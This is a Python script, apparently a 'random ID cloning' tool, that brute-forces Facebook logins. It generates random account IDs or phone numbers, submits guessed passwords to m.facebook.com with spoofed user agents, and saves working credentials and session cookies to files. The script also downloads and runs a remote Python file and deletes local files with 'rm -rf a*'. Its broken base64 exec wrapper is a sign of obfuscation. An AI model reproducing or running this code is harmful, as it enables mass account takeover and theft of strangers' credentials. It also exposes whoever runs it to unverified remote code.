# #RANDOM_TOOL_MID_BY_LTKYAW


import base64
exec(base64.b64decode('from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python LTKYAW.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
LTKYAW = '{ LTKYAW }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = []

def clear():
    os.system('clear')
    print(logo)
logo =  """   \x1b[97m[\033[37;41m 𝗡𝗘𝗪 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟬.𝟰 \033[0;m]
\033[1;32m  ___    _   _  _ ___   ___  __  __ 
 | _ \  /_\ | \| |   \ / _ \|  \/  |
 |   / / _ \| .` | |) | (_) | |\/| |
 |_|_\/_/ \_\_|\_|___/ \___/|_|  |_|                                  
\033[1;32m╔═\033[1;34m═════════════════════════════════\033[1;32m═╗
\033[1;34m| \033[1;31m ミ★ \033[1;32m𝗙𝗕 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦 \033[1;31m★彡\33[0m \033[1;34m |
\033[1;34m|\033[1;34m═══════════════════════════════════\033[1;34m|
\033[1;34m| \033[1;31m[\033[1;32m‣\033[1;31m] \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑   ⸻‣   𝐋𝐓𝐊𝐘𝐀𝐖 \033[1;34m        |
\033[1;34m| \033[1;31m[\033[1;32m‣\033[1;31m] \033[1;32m 𝐓𝐎𝐎𝐋𝐒    ⸻‣   𝐑𝐀𝐍𝐃𝐎𝐌 \033[1;34m        |
\033[1;34m| \033[1;31m[\033[1;32m‣\033[1;31m] \033[1;32m 𝐒𝐓𝐀𝐓𝐔𝐒   ⸻‣   𝐏𝐀𝐈𝐃 \033[1;34m          |
\033[1;34m| \033[1;31m[\033[1;32m‣\033[1;31m] \033[1;32m 𝐍𝐎𝐓𝐄     ⸻‣   𝐈𝐃 + 𝐍𝐔𝐌𝐁𝐄𝐑 \033[1;34m   |
\033[1;32m╚═\033[1;34m═════════════════════════════════\033[1;32m═╝"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading wait ltkyaw tool ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/Jenex9/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Jenex9/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/Jenex9/main/RANDOM.py > RANDOM.py')
        os.system('python RANDOM.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def ltkyaw():
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;32mG\033[1;31m] \033[1;32mYOU WANT START PROGRAM')
    print(37*'\033[1;34m═')
    opt = input(' ➦ ')
    if opt =='G':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;32mCRACK RANDOM OLD ID ')
    print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;32mCARCK RANDOM NUMBER ')
    print('\033[1;34m═════════════════════════════════════ ')
    print('\x1b[97m[\033[37;41m👉 Dont Forget To LTKYAW Thankful 👈\033[0;m]')
    print(37*'\033[1;34m═')
    opt = input('\033[1;32mCHOOSE ‣ ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;32mCRACK LIMIT ID ‣ '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;32mEXAMPLE ‣ \033[1;33m123456 \033[0;97m')
    pwx = input('\033[1;32mPUT PW ‣ ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32mTOTAL ID ‣ '+tl)
        print('\033[1;32mPROCESS HAS BEEN STARTED...')
        print(37*'\033[1;34m═')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(37*'\033[1;34m═')
    print('\033[3;94m‣ Crack process has been completed')
    print('\033[3;94m‣ Ids saved in ok.txt,cp.txt')
    print(37*'\033[1;34m═')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('\x1b[97m\033[37;41mIF YOU MYANMAR ‣ USE MMR CODE\033[0;m ')
    print('\033[1;32mENTER YOUR 👇SIM CODE BELOW \033[0;97m')
    kode = input('\033[1;32mPUT CODE ‣ ')
    print('\x1b[97m\033[37;44m[FAST CRACK] 100K ‣ 200K [RECOMMENDED]\033[0;m ')
    limit = int(input('\033[1;32mCRACK ID LIMIT ‣ '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32mCRACK TOTAL ID ‣\033[1;33m '+tl)
        print(37*'\033[1;34m═')
        print('\x1b[97m[\033[37;45m 🔥 WELCOME LTKYAW RANDOM TOOLS 🔥 \033[0;m] ')
        print(37*'\033[1;34m═')
        print('\033[1;32mYOUR CODE ‣\033[1;33m '+kode)
        print('\033[1;32mPROCESS HAS BEEN STARTED...')
        print('✘✘ WAIT AND SEE ✘✘')
        print(37*'\033[1;34m═')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(37*'\033[1;34m═')
    print('\033[3;94m ‣ Crack Process Has Been Completed')
    print('\033[3;95m ‣ Dont Forget To LTKYAW Thankful ')
    print(37*'\033[1;34m═')

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'm.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m ➦[OK] '+cid+' | '+ps+ '\n\033[1;35m Cookie \033[1;32m✔︎ '+coki+'\033[1;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;2;255;127;0;1m ➦[CP] '+cid+' | '+ps+'\033[1;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \033[1;31m➦\033[1;37m[\033[1;35m%s\033[1;37m/\033[1;34m%s\033[1;37m]—[\033[1;32m%s\033[1;37m]—[\033[1;33m%s\033[1;37m] \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
        checks(oks,coki,cps,twf)
    except:
        pass

ltkyaw()
    '))
